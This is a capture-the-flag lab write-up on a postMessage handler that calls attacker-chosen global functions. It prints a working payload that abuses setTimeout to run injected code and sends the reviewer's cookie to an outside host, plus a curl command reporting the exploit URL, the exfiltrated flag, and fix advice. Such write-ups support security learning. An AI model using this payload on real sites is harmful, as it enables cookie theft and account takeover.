# Portway Pwnbox Lab - postMessage indirect-call gadget XSS

Date: 2026-07-10
Target type: CTF/lab
Bug class: postMessage trust failure, indirect eval gadget, XSS, reviewer bot abuse

## Observation

Login app at `https://c5ae55663e37.pwnbox-lab.com/`.

Sandbox credentials: `demo / demo123`.

The handoff widget at `GET /embed/handoff` contained:

```javascript
window.addEventListener('message', function(event) {
    if (event.data && event.data.action === 'log') {
        window[event.data.func](event.data)
    }
});
```

Users can report partner URLs at `POST /report`; a reviewer opens them in a fresh authenticated session.

## Hypothesis

If partner-controlled `postMessage` data can choose both the global function name and the argument, the widget may expose a code-execution gadget. A popup (not iframe) is likely required so the handoff page runs first-party and can read the reviewer's non-HttpOnly `flag` cookie.

## Evidence

### Gadget behavior

- `window['eval'](arrayPayload)` does **not** execute code (indirect eval returns a string)
- `window['setTimeout'](arrayPayload)` **does** execute the array's string form as legacy timer code
- Arrays keep attacker properties (`action`, `func`) through `postMessage` structured clone
- Custom `toString` functions are stripped by structured clone; `new String(code)` also loses attached properties

### Working payload shape

Partner page:

1. `window.open('https://c5ae55663e37.pwnbox-lab.com/embed/handoff')`
2. send:

```javascript
const code = '(new Image).src="https://[oast]/?c="+encodeURIComponent(document.cookie)';
const p = [code];
p.action = 'log';
p.func = 'setTimeout';
popup.postMessage(p, '*');
```

### Reviewer exfil (confirmed)

```text
GET /?c=flag%3Dpwnbox%7B41a864851130a234ef431e95309a03c3%7D
Origin: https://c5ae55663e37.pwnbox-lab.com
```

## Test

Hosted exploit at `https://l30on.top/k/portwaypw` and reported via:

```bash
curl -sS -X POST "https://c5ae55663e37.pwnbox-lab.com/report" \
  -b portway_session=[demo-session] \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "url=https://l30on.top/k/portwaypw"
```

## Result

Reviewer callback exfiltrated:

```text
flag=pwnbox{41a864851130a234ef431e95309a03c3}
```

## Conclusion

Confirmed client-side trust failure in the Portway handoff SDK. The widget executed attacker-selected global functions with attacker-controlled arguments from `postMessage` data. Using `func: 'setTimeout'` and an array payload bypassed indirect-eval restrictions and achieved XSS in the Portway origin, leaking the reviewer's `flag` cookie.

## Root cause

- No validation of `event.origin`
- Dynamic dispatch: `window[event.data.func](event.data)`
- Legacy `setTimeout(string)` semantics turn a cloned array into executable code

## Fix

- Never dispatch on attacker-controlled function names
- Validate `event.origin` against an allowlist
- Ignore or tightly schema-validate `postMessage` payloads
- Do not expose logging/debug hooks in production embeds

## Flag

`pwnbox{41a864851130a234ef431e95309a03c3}`
